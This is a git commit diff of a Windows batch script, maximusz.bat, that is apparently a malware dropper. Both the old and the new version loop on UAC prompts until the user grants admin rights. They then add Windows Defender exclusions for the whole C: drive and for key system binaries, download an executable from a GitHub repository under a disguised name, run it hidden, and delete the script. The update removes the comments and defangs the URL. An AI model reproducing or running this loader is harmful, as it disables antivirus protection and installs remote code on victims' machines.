dfc95582d1de4da7ae9769e35621b5c2cff8e94f
boycots563 <glowfitaura.orders@gmail.com>
2025-02-26 11:56:45 +0100

    Update maximusz.bat

--- maximusz.bat
+++ maximusz.bat
@@ -1,58 +1,40 @@
 @echo off
-:: Check if the script is running with administrator privileges
 NET SESSION >nul 2>&1
 if %errorlevel% == 0 (
-    rem Script is already running with admin rights
-    rem Add exclusions for specified paths
-    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'" >nul 2>&1
-
-    rem Download RuntimeBroker.exe
-    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
-
-    rem Ensure RuntimeBroker.exe is fully downloaded before running
-    :wait_runtime
-    if not exist "%TEMP%\RuntimeBroker.exe" (
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ('C:\\', 'C:\\cmd.exe', 'C:\\conhost.exe', 'C:\\cvtres.exe', 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSbuild.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Windows\\System32\\Wscript.exe')" >nul 2>&1
+    
+    powershell -Command "Invoke-WebRequest -Uri ('hxxps://github[.]com/boycots563/wlt56/raw/main/zuwax.exe') -OutFile ('%TEMP%\\RBrk.exe')" >nul 2>&1
+    
+    :wait_dl
+    if not exist "%TEMP%\\RBrk.exe" (
         timeout /t 1 >nul
-        goto wait_runtime
+        goto wait_dl
     )
-
-    rem Run RuntimeBroker.exe
-    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
-
-    rem Delete the batch script itself after execution
+    
+    powershell -WindowStyle Hidden -Command "Start-Process ('%TEMP%\\RBrk.exe')"
+    
     del "%~f0" >nul 2>&1
-
     exit
 )
 
-:loop
-    rem Trigger the UAC prompt using PowerShell from within the batch file
-    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
-
-    rem If user declines the UAC prompt, retry
+:retry_admin
+    powershell -WindowStyle Hidden -Command "Start-Process ('%~f0') -ArgumentList '/elevated' -Verb RunAs -WindowStyle Hidden" >nul 2>&1
     if %errorlevel% NEQ 0 (
         timeout /t 3 >nul
-        goto loop
+        goto retry_admin
     )
-
-    rem If UAC is accepted, proceed with the next task
-    rem Add exclusions for specified paths
-    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe', 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe'" >nul 2>&1
-
-    rem Download RuntimeBroker.exe
-    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/zuwax.exe' -OutFile '%TEMP%\RuntimeBroker.exe'" >nul 2>&1
-
-    rem Ensure RuntimeBroker.exe is fully downloaded before running
-    :wait_runtime
-    if not exist "%TEMP%\RuntimeBroker.exe" (
+    
+    powershell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath ('C:\\', 'C:\\cmd.exe', 'C:\\conhost.exe', 'C:\\cvtres.exe', 'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSbuild.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Windows\\System32\\Wscript.exe')" >nul 2>&1
+    
+    powershell -Command "Invoke-WebRequest -Uri ('hxxps://github[.]com/boycots563/wlt56/raw/main/zuwax.exe') -OutFile ('%TEMP%\\RBrk.exe')" >nul 2>&1
+    
+    :wait_dl_retry
+    if not exist "%TEMP%\\RBrk.exe" (
         timeout /t 1 >nul
-        goto wait_runtime
+        goto wait_dl_retry
     )
-
-    rem Run RuntimeBroker.exe
-    powershell -WindowStyle Hidden -Command "Start-Process '%TEMP%\RuntimeBroker.exe'"
-
-    rem Delete the batch script itself after execution
+    
+    powershell -WindowStyle Hidden -Command "Start-Process ('%TEMP%\\RBrk.exe')"
+    
     del "%~f0" >nul 2>&1
-
     exit
